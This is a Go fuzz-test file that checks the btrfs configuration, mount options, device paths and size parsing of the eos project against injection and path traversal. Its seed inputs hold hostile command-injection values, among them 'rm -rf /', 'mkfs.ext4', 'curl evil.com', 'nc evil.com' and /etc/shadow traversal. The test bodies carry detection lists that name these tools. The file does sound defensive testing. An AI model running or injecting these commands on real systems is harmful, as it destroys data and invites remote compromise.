package btrfs

import (
	"strings"
	"testing"
	"time"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/testutil"
)

// FuzzConfigSecurity tests Config structure for security vulnerabilities
func FuzzConfigSecurity(f *testing.F) {
	// Seed with various security-focused inputs
	f.Add("/dev/sda1", "myvolume", "550e8400-e29b-41d4-a716-446655440000", "/mnt/data", "compress=zstd:3", "zstd", 3)
	f.Add("", "", "", "", "", "", 0)
	f.Add("../../etc/passwd", "vol;rm -rf /", "$(whoami)", "/tmp/../../../root", "nodatacow;id", "zstd", 99)
	f.Add("/dev/sda1;mkfs.ext4 /dev/sdb1", "label`reboot`", "", "/mnt/data\x00/etc/shadow", "compress=$(curl evil.com)", "none", -1)
	f.Add("/dev/null", strings.Repeat("A", 10000), strings.Repeat("B", 40), "/mnt/${IMPORTANT_VAR}", "compress=zstd:3,ro,exec", "lzo", 15)
	f.Add("\\\\server\\share", "label\ninjection", "not-a-uuid", "C:\\Windows\\System32", "compress|nc evil.com", "", 0)
	f.Add("/dev/mapper/../../sda1", "label\ttab", "550e8400-e29b-41d4-a716-446655440000\n", "../mnt/data", "space_cache=v2;bash", "zlib", 16)

	f.Fuzz(func(t *testing.T, device, label, uuid, mountPoint, mountOptions, compression string, compressionLevel int) {
		// Test should not panic
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Config handling panicked with device=%q: %v", device, r)
			}
		}()

		// Create config
		config := &Config{
			Device:           device,
			Label:            label,
			UUID:             uuid,
			MountPoint:       mountPoint,
			MountOptions:     strings.Split(mountOptions, ","),
			Compression:      compression,
			CompressionLevel: compressionLevel,
		}

		// Security validation
		allFields := device + label + uuid + mountPoint + mountOptions + compression

		// Check for command injection
		injectionPatterns := []string{
			";", "&&", "||", "|", "`", "$(", "${",
			"rm -rf", "mkfs", "dd ", "cat /etc/", "nc ",
			"bash", "sh ", "exec", "eval", "curl", "wget",
		}

		for _, pattern := range injectionPatterns {
			if strings.Contains(allFields, pattern) {
				t.Logf("Command injection pattern '%s' detected", pattern)
			}
		}

		// Check for path traversal
		if strings.Contains(device, "..") || strings.Contains(mountPoint, "..") {
			t.Logf("Path traversal attempt detected")
		}

		// Check for null bytes
		if strings.Contains(allFields, "\x00") {
			t.Logf("Null byte injection detected")
		}

		// Validate device path
		if device != "" {
			if !strings.HasPrefix(device, "/dev/") && !strings.HasPrefix(device, "/") {
				t.Logf("Suspicious device path: %q", device)
			}

			// Check for device manipulation
			if strings.Count(device, "/") > 4 {
				t.Logf("Deeply nested device path: %q", device)
			}
		}

		// Validate UUID format
		if uuid != "" && len(uuid) != 36 {
			t.Logf("Invalid UUID length: %d", len(uuid))
		}

		// Validate label
		if len(label) > 256 {
			t.Logf("Excessively long label: %d bytes", len(label))
		}

		// Check for control characters in label
		for _, r := range label {
			if r < 32 && r != 9 { // Allow tab
				t.Logf("Control character in label: 0x%02x", r)
			}
		}

		// Validate mount options
		dangerousMountOptions := []string{
			"exec", "suid", "dev", // Security-sensitive options
			"users", "owner", // Permission-related
		}

		for _, opt := range config.MountOptions {
			opt = strings.TrimSpace(opt)

			// Check for injection in options
			if strings.ContainsAny(opt, ";|&`$()") {
				t.Logf("Injection characters in mount option: %q", opt)
			}

			// Check for dangerous options
			for _, dangerous := range dangerousMountOptions {
				if strings.HasPrefix(opt, dangerous) {
					t.Logf("Potentially dangerous mount option: %q", opt)
				}
			}
		}

		// Validate compression settings
		validCompressions := []string{"none", "zlib", "lzo", "zstd"}
		if compression != "" {
			valid := false
			for _, v := range validCompressions {
				if compression == v {
					valid = true
					break
				}
			}
			if !valid {
				t.Logf("Invalid compression type: %q", compression)
			}
		}

		// Validate compression level
		if compression == "zstd" && (compressionLevel < 1 || compressionLevel > 15) {
			t.Logf("Invalid zstd compression level: %d", compressionLevel)
		}

		// Check for extremely long paths (DoS)
		if len(mountPoint) > 4096 {
			t.Logf("Extremely long mount point: %d bytes", len(mountPoint))
		}
	})
}

// FuzzVolumeInfoSecurity tests VolumeInfo handling for security issues
func FuzzVolumeInfoSecurity(f *testing.F) {
	// Seed with various inputs
	f.Add("550e8400-e29b-41d4-a716-446655440000", "backup", int64(1000000000), int64(500000000), "/dev/sda1", "/mnt/backup")
	f.Add("", "", int64(0), int64(0), "", "")
	f.Add("not-a-uuid", "label;rm -rf /", int64(-1), int64(-1), "/dev/../sda1", "/mnt/../../etc")
	f.Add(strings.Repeat("A", 100), strings.Repeat("B", 1000), int64(9223372036854775807), int64(9223372036854775807), "/dev/null", "")

	f.Fuzz(func(t *testing.T, uuid, label string, totalSize, usedSize int64, device, mountPoint string) {
		// Test should not panic
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("VolumeInfo handling panicked: %v", r)
			}
		}()

		// Create volume info
		info := &VolumeInfo{
			UUID:        uuid,
			Label:       label,
			TotalSize:   totalSize,
			UsedSize:    usedSize,
			Devices:     []string{device},
			MountPoints: []string{mountPoint},
			CreatedAt:   time.Now(),
		}

		// Use info to avoid unused variable error
		_ = info

		// Validate sizes
		if totalSize < 0 {
			t.Logf("Negative total size: %d", totalSize)
		}

		if usedSize < 0 {
			t.Logf("Negative used size: %d", usedSize)
		}

		if usedSize > totalSize && totalSize > 0 {
			t.Logf("Used size exceeds total size")
		}

		// Check for injection in string fields
		if strings.ContainsAny(label, ";|&`$()") {
			t.Logf("Injection characters in label: %q", label)
		}

		// Validate device paths
		for _, dev := range info.Devices {
			if strings.Contains(dev, "..") {
				t.Logf("Path traversal in device: %q", dev)
			}
			if !strings.HasPrefix(dev, "/") && dev != "" {
				t.Logf("Relative device path: %q", dev)
			}
		}

		// Validate mount points
		for _, mp := range info.MountPoints {
			if strings.Contains(mp, "..") {
				t.Logf("Path traversal in mount point: %q", mp)
			}
			if strings.Contains(mp, "\x00") {
				t.Logf("Null byte in mount point: %q", mp)
			}
		}
	})
}

// FuzzSubvolumeInfoSecurity tests SubvolumeInfo for security issues
func FuzzSubvolumeInfoSecurity(f *testing.F) {
	// Seed with various inputs
	f.Add(int64(256), "/data/subvol1", int64(5), int64(5), int64(100), "550e8400-e29b-41d4-a716-446655440000", "", "")
	f.Add(int64(0), "", int64(0), int64(0), int64(0), "", "", "")
	f.Add(int64(-1), "/../../../root/subvol", int64(-1), int64(-1), int64(-1), "uuid", "parent", "received")
	f.Add(int64(999999), "/data/$(whoami)/subvol", int64(0), int64(0), int64(0), "", "", "")
	f.Add(int64(1), "/data/subvol;rm -rf /", int64(1), int64(1), int64(1), strings.Repeat("A", 100), "", "")

	f.Fuzz(func(t *testing.T, id int64, path string, parentID, topLevel, generation int64, uuid, parentUUID, receivedUUID string) {
		// Test should not panic
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("SubvolumeInfo handling panicked: %v", r)
			}
		}()

		// Create subvolume info
		info := &SubvolumeInfo{
			ID:           id,
			Path:         path,
			ParentID:     parentID,
			TopLevel:     topLevel,
			Generation:   generation,
			UUID:         uuid,
			ParentUUID:   parentUUID,
			ReceivedUUID: receivedUUID,
		}

		// Use info to avoid unused variable error
		_ = info

		// Validate IDs
		if id < 0 {
			t.Logf("Negative subvolume ID: %d", id)
		}

		if parentID < 0 && parentID != -1 { // -1 might be valid for root
			t.Logf("Invalid parent ID: %d", parentID)
		}

		// Validate path
		if strings.Contains(path, "..") {
			t.Logf("Path traversal in subvolume path: %q", path)
		}

		if strings.ContainsAny(path, ";|&`$()") {
			t.Logf("Command injection characters in path: %q", path)
		}

		if strings.Contains(path, "\x00") {
			t.Logf("Null byte in path: %q", path)
		}

		// Check for suspicious patterns
		suspiciousPatterns := []string{
			"/proc/", "/sys/", "/dev/", "/.ssh/", "/root/",
			"/etc/passwd", "/etc/shadow", "/boot/",
		}

		for _, pattern := range suspiciousPatterns {
			if strings.Contains(path, pattern) {
				t.Logf("Suspicious path pattern: %q in %q", pattern, path)
			}
		}

		// Validate UUIDs
		if uuid != "" && len(uuid) != 36 && uuid != "-" {
			t.Logf("Invalid UUID format: %q", uuid)
		}

		// Check relationships
		if parentID == id && id != 0 {
			t.Logf("Subvolume is its own parent: %d", id)
		}

		if generation < 0 {
			t.Logf("Negative generation: %d", generation)
		}
	})
}

// FuzzSnapshotConfigSecurity tests snapshot configuration for security
func FuzzSnapshotConfigSecurity(f *testing.F) {
	// Seed with various inputs
	f.Add("/data/source", "/data/.snapshots/snap1", true, false)
	f.Add("", "", false, false)
	f.Add("/../../../etc", "/tmp/snap", true, true)
	f.Add("/data/$(date)", "/data/snap;rm -rf /", false, true)
	f.Add("/data/source\x00", "/data/snap\ninjection", true, false)
	f.Add(strings.Repeat("/nested", 100), strings.Repeat("/snap", 100), true, true)

	f.Fuzz(func(t *testing.T, sourcePath, snapshotPath string, readonly, recursive bool) {
		// Test should not panic
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("SnapshotConfig handling panicked: %v", r)
			}
		}()

		// Create snapshot config
		config := &SnapshotConfig{
			SourcePath:   sourcePath,
			SnapshotPath: snapshotPath,
			Readonly:     readonly,
			Recursive:    recursive,
		}

		// Use config to avoid unused variable error
		_ = config

		// Validate paths
		paths := []string{sourcePath, snapshotPath}
		for _, path := range paths {
			if path == "" {
				continue
			}

			// Check for path traversal
			if strings.Contains(path, "..") {
				t.Logf("Path traversal detected: %q", path)
			}

			// Check for command injection
			if strings.ContainsAny(path, ";|&`$()") {
				t.Logf("Command injection characters in path: %q", path)
			}

			// Check for null bytes
			if strings.Contains(path, "\x00") {
				t.Logf("Null byte in path: %q", path)
			}

			// Check for newlines (log injection)
			if strings.ContainsAny(path, "\n\r") {
				t.Logf("Newline characters in path: %q", path)
			}

			// Check path depth (DoS)
			if strings.Count(path, "/") > 50 {
				t.Logf("Extremely deep path: %q", path)
			}

			// Check absolute path
			if path != "" && !strings.HasPrefix(path, "/") {
				t.Logf("Relative path used: %q", path)
			}
		}

		// Check if source and snapshot paths are the same
		if sourcePath == snapshotPath && sourcePath != "" {
			t.Logf("Source and snapshot paths are identical: %q", sourcePath)
		}

		// Check if snapshot path is parent of source
		if snapshotPath != "" && strings.HasPrefix(sourcePath, snapshotPath+"/") {
			t.Logf("Snapshot path is parent of source path")
		}

		// Validate permissions implications
		if !readonly && strings.Contains(snapshotPath, "/.snapshots/") {
			t.Logf("Writable snapshot in snapshots directory")
		}
	})
}

// FuzzMountOptionsSecurity tests mount options for security vulnerabilities
func FuzzMountOptionsSecurity(f *testing.F) {
	// Seed with various mount option scenarios
	f.Add("compress=zstd:3,noatime,space_cache=v2")
	f.Add("")
	f.Add("compress=zstd:3;id")
	f.Add("compress=$(whoami),noatime")
	f.Add("compress=zstd:3,exec,suid,dev")
	f.Add("compress=zstd:99,noatime,autodefrag")
	f.Add(strings.Repeat("option,", 1000))
	f.Add("compress=zstd:3\nmalicious,noatime")
	f.Add("compress=../../etc/passwd")
	f.Add("user_subvol_rm_allowed,acl,user_xattr")

	f.Fuzz(func(t *testing.T, optionsStr string) {
		// Test should not panic
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Mount options handling panicked: %v", r)
			}
		}()

		// Split options
		options := strings.Split(optionsStr, ",")

		// Security validation
		dangerousOptions := []string{
			"exec", "suid", "dev", // Allow code execution
			"user", "users", "owner", // User-controlled mounts
			"defaults",               // Includes exec, suid, dev
			"user_subvol_rm_allowed", // Allows subvolume deletion
		}

		compressOptions := []string{
			"compress", "compress-force",
		}

		for _, opt := range options {
			opt = strings.TrimSpace(opt)
			if opt == "" {
				continue
			}

			// Check for command injection
			if strings.ContainsAny(opt, ";|&`$(){}[]<>") {
				t.Logf("Command injection characters in option: %q", opt)
			}

			// Check for path traversal in options
			if strings.Contains(opt, "..") {
				t.Logf("Path traversal in option: %q", opt)
			}

			// Check for newlines (config injection)
			if strings.ContainsAny(opt, "\n\r") {
				t.Logf("Newline in mount option: %q", opt)
			}

			// Check for dangerous options
			for _, dangerous := range dangerousOptions {
				if opt == dangerous || strings.HasPrefix(opt, dangerous+"=") {
					t.Logf("Dangerous mount option: %q", opt)
				}
			}

			// Validate compression options
			for _, compOpt := range compressOptions {
				if strings.HasPrefix(opt, compOpt+"=") {
					value := strings.TrimPrefix(opt, compOpt+"=")

					// Check compression algorithm
					validAlgos := []string{"zlib", "lzo", "zstd", "no", "none"}
					parts := strings.Split(value, ":")
					algo := parts[0]

					valid := false
					for _, v := range validAlgos {
						if algo == v {
							valid = true
							break
						}
					}

					if !valid {
						t.Logf("Invalid compression algorithm: %q", algo)
					}

					// Check compression level for zstd
					if algo == "zstd" && len(parts) > 1 {
						level := parts[1]
						// Should be 1-15
						for _, c := range level {
							if c < '0' || c > '9' {
								t.Logf("Non-numeric compression level: %q", level)
								break
							}
						}
					}
				}
			}

			// Check for excessively long options
			if len(opt) > 256 {
				t.Logf("Excessively long mount option: %d bytes", len(opt))
			}
		}

		// Check total options length (DoS)
		if len(optionsStr) > 4096 {
			t.Logf("Extremely long options string: %d bytes", len(optionsStr))
		}

		// Check number of options (DoS)
		if len(options) > 100 {
			t.Logf("Excessive number of options: %d", len(options))
		}
	})
}

// FuzzDevicePathSecurity specifically tests device path validation
func FuzzDevicePathSecurity(f *testing.F) {
	// Seed with various device paths
	f.Add("/dev/sda1")
	f.Add("/dev/mapper/vg0-lv0")
	f.Add("")
	f.Add("../../dev/sda1")
	f.Add("/dev/sda1;mkfs.ext4 /dev/sdb1")
	f.Add("/dev/../etc/passwd")
	f.Add("/dev/null\x00/dev/sda1")
	f.Add("\\\\?\\PhysicalDrive0")
	f.Add("/dev/disk/by-uuid/550e8400-e29b-41d4-a716-446655440000")
	f.Add("/dev/$(uname -n)/sda1")
	f.Add("/tmp/fake-device")
	f.Add(strings.Repeat("/dev", 100))

	f.Fuzz(func(t *testing.T, device string) {
		// Test should not panic
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Device path handling panicked with device=%q: %v", device, r)
			}
		}()

		rc := testutil.TestRuntimeContext(t)

		// Simulate device checks
		if device == "" {
			t.Logf("Empty device path")
			return
		}

		// Security checks
		// Check for path traversal
		if strings.Contains(device, "..") {
			t.Logf("Path traversal in device path: %q", device)
		}

		// Check for null bytes
		if strings.Contains(device, "\x00") {
			t.Logf("Null byte in device path: %q", device)
		}

		// Check for command injection
		if strings.ContainsAny(device, ";|&`$(){}[]<>") {
			t.Logf("Command injection characters in device: %q", device)
		}

		// Validate device path format
		validPrefixes := []string{
			"/dev/",
			"/dev/disk/by-",
			"/dev/mapper/",
		}

		hasValidPrefix := false
		for _, prefix := range validPrefixes {
			if strings.HasPrefix(device, prefix) {
				hasValidPrefix = true
				break
			}
		}

		if !hasValidPrefix && !strings.HasPrefix(device, "/") {
			t.Logf("Suspicious device path format: %q", device)
		}

		// Check for suspicious device names
		suspiciousDevices := []string{
			"/dev/null", "/dev/zero", "/dev/random", "/dev/urandom",
			"/dev/full", "/dev/stdin", "/dev/stdout", "/dev/stderr",
		}

		for _, suspicious := range suspiciousDevices {
			if device == suspicious {
				t.Logf("Suspicious device: %q", device)
			}
		}

		// Check Windows-style paths
		if strings.Contains(device, "\\") || strings.Contains(device, ":") {
			t.Logf("Windows-style path detected: %q", device)
		}

		// Simulate device validation
		_, _ = isDeviceMounted(rc, device)
		_, _ = deviceHasFilesystem(rc, device)
	})
}

// FuzzParseBTRFSSizeSecurity tests size parsing for security issues
func FuzzParseBTRFSSizeSecurity(f *testing.F) {
	// Seed with various size strings
	f.Add("10.00GiB")
	f.Add("100MiB")
	f.Add("")
	f.Add("-10GiB")
	f.Add("10GiB;rm -rf /")
	f.Add("999999999999999999999GiB")
	f.Add("10$(whoami)GiB")
	f.Add("10.00GiB\n20.00GiB")
	f.Add("0x10GiB")
	f.Add("10.00.00GiB")
	f.Add(strings.Repeat("9", 1000) + "GiB")

	f.Fuzz(func(t *testing.T, sizeStr string) {
		// Test should not panic
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Size parsing panicked with input=%q: %v", sizeStr, r)
			}
		}()

		// Parse size
		size := parseBTRFSSize(sizeStr)

		// Security validation
		// Check for injection
		if strings.ContainsAny(sizeStr, ";|&`$()") {
			t.Logf("Command injection characters in size: %q", sizeStr)
		}

		// Check for negative values
		if strings.HasPrefix(strings.TrimSpace(sizeStr), "-") {
			t.Logf("Negative size value: %q", sizeStr)
			if size > 0 {
				t.Errorf("Negative size string resulted in positive value")
			}
		}

		// Check for overflow attempts
		if len(sizeStr) > 100 {
			t.Logf("Extremely long size string: %d bytes", len(sizeStr))
		}

		// Check for multiple values (injection attempt)
		if strings.ContainsAny(sizeStr, "\n\r;,") {
			t.Logf("Multiple values in size string: %q", sizeStr)
		}

		// Check for hex/octal attempts
		if strings.HasPrefix(sizeStr, "0x") || strings.HasPrefix(sizeStr, "0X") {
			t.Logf("Hex notation in size: %q", sizeStr)
		}

		// Validate result
		if size < 0 {
			t.Logf("Negative size result: %d", size)
		}

		// Check for unrealistic sizes
		oneEB := int64(1024 * 1024 * 1024 * 1024 * 1024 * 1024) // 1 exabyte
		if size > oneEB {
			t.Logf("Unrealistically large size: %d", size)
		}
	})
}
